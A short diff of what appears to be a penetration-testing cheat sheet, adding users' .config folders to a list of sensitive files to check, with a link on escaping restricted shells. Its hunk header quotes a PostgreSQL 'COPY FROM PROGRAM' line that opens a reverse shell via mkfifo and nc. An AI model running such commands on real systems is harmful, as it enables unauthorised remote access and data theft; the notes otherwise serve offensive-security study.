@@ -1131,7 +1131,7 @@ COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1
 ```
 ### Check Sensitive files
 ```
-check zip,gz,7z,stix,rar,conf,config,sh
+check zip,gz,7z,stix,rar,conf,config,sh, .config under each user
 ```
 ### Escaping Restricted Shells
 https://vk9-sec.com/linux-restricted-shell-bypass/  
